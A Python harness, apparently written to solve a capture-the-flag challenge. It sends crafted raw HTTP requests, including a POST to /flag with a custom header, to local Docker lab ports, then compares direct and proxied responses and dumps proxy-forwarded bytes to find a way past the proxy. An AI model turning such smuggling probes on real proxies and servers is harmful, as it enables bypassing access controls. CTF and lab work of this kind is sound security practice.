#!/usr/bin/env python3
"""
Session-2 differential harness for mccrab3.

Ports (docker labs, see NOTES.md):
  28888 proxoxy -> real server.py     (REALP)
  28900 gunicorn direct, real app     (REALD)
  48888 proxoxy -> raw byte dumper    (RAWP)   container mccrab3r
"""
import socket
import subprocess
import sys
import time

H = "127.0.0.1"
REALP, REALD, RAWP = 28888, 28900, 48888

WAKE = b"GET /health HTTP/1.1\r\nHost: h\r\n\r\n"


def conv(port, chunks, gap=0.35, read_for=2.0, timeout=6.0):
    """Send a list of byte chunks with a gap between them; return everything read."""
    s = socket.create_connection((H, port), timeout=timeout)
    out = b""
    s.settimeout(0.25)
    for i, c in enumerate(chunks):
        s.sendall(c)
        t0 = time.time()
        while time.time() - t0 < gap:
            try:
                d = s.recv(65536)
                if not d:
                    break
                out += d
            except socket.timeout:
                pass
    s.settimeout(read_for)
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except (socket.timeout, OSError):
        pass
    try:
        s.close()
    except OSError:
        pass
    return out


def rawlog_count():
    o = subprocess.run(["docker", "logs", "--tail", "600", "mccrab3r"],
                       capture_output=True)
    return (o.stdout + o.stderr).decode(errors="replace")


def forwarded(payload, gap=0.35):
    before = rawlog_count().count("=== PROXY->BACKEND BYTES ===")
    conv(RAWP, [payload], gap=gap, read_for=0.4)
    time.sleep(0.4)
    log = rawlog_count()
    parts = log.split("=== PROXY->BACKEND BYTES ===")[1 + before:]
    return "".join(p.split("\n")[1] for p in parts)


def summarise(tag, data):
    n = data.count(b"HTTP/1.1 ")
    codes = [data[i:i + 20].decode(errors="replace")
             for i in range(len(data)) if data.startswith(b"HTTP/1.1 ", i)]
    flag = b"TFCCTF{" in data
    return f"{tag}: resp={n} flag={flag} first={codes[:3]}"


def t(name, payload, wake=True, show_fwd=False, gap=0.35):
    chunks = [payload] + ([WAKE] if wake else [])
    d_direct = conv(REALD, chunks, gap=gap)
    d_proxy = conv(REALP, chunks, gap=gap)
    print(f"### {name}")
    print("   ", summarise("gunicorn-direct", d_direct))
    print("   ", summarise("via-proxoxy    ", d_proxy))
    if show_fwd:
        print("    fwd:", forwarded(payload)[:300])
    if b"TFCCTF{" in d_proxy:
        print("    *** FLAG THROUGH PROXY ***", d_proxy[d_proxy.find(b"TFCCTF{"):][:80])
    sys.stdout.flush()
    return d_direct, d_proxy


SMUG = (b"POST /flag HTTP/1.1\r\n"
        b"Host: h\r\n"
        b"brevski: george\r\n"
        b"Content-Length: 0\r\n"
        b"\r\n")

if __name__ == "__main__":
    # sanity: does the direct path give the flag at all
    t("baseline direct POST /flag brevski", SMUG, wake=False)
